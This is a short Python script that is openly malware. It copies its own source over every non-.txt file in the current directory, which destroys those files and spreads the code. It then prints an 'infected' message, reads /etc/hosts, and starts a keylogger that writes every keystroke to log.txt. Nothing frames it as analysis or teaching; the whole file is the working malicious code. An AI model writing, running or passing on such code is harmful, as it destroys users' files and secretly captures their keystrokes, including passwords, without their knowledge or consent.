import sys
import os
import socket
import tqdm
import time
host_info = []
script = sys.argv[0]
direct = [i for i in os.listdir()]
for i in direct:
    if '.txt' in i:
        direct.remove(i)
[direct.remove(i) for i in direct if '.txt' in i]
with open(script, 'r') as f:
    read = f.read()
for i in direct:
    with open(i, 'w') as w:
        w.write(read)
if (open(direct[0]).read()) \
        or (open(direct[1]).read()) \
        or (open(direct[2]).read()) == read:
    print("Viral Load Infected Directory Files.")
    hosts = open('/etc/hosts', 'r')
    o = ([i for i in hosts])
    [host_info.append(i) for i in o]
    if host_info[0] != " ":
        from pynput.keyboard import Key, Listener
        import logging

        log_dir = ""
        logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def on_press(key):
            logging.info(str(key))
        with Listener(on_press=on_press) as listener:
            listener.join()
